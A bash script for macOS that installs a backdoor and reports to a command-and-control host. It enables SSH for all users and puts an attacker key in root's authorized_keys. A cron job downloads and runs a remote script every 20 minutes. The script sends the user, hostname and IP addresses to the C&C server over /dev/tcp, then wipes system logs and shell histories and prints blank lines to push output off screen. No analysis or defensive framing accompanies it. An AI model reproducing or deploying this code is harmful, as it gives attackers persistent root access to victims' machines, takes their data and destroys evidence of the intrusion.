#!/bin/bash
host=boesen.science

# Enable SSH
systemsetup -setremotelogin on >/dev/null
# Open SSH to all users
dscl . change /Groups/com.apple.access_ssh RecordName com.apple.access_ssh com.apple.access_ssh-disabled >/dev/null

# Add update to crontab
(crontab -l 2>/dev/null; echo "*/20 * * * * curl -L $host:2042/mac/update.sh |bash") | crontab -

sshpath="/var/root/.ssh"
mkdir -p "$sshpath" # On most computers, there won't be a .ssh directory initially

rm "$sshpath/authorized_keys" # Just in case
curl -Lso "$sshpath/authorized_keys" $host:2042/pubkey

user=$(stat -f "%Su" /dev/console) # Get user currently logged in (in GUI).
hostname=$(hostname)
ip=$(/sbin/ifconfig | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0.1')

info="$user $hostname $ip"

port=2043

# Send data to C&C
exec 3<>/dev/tcp/$host/$port
printf "JOIN: $info" >&3

function timeout() { perl -e 'alarm shift; exec @ARGV' "$@"; }
# Print response, time out if none
timeout 1 cat <&3 && echo

printf "$user $hostname" > /etc/info
echo "$ip" >> /etc/ips

rm -rf /var/log/*
rm -f /var/root/.*history /Users/*/.*history

for i in {1..50}; do
    printf "\\n\\n\\n\\n\\n\\n"
done
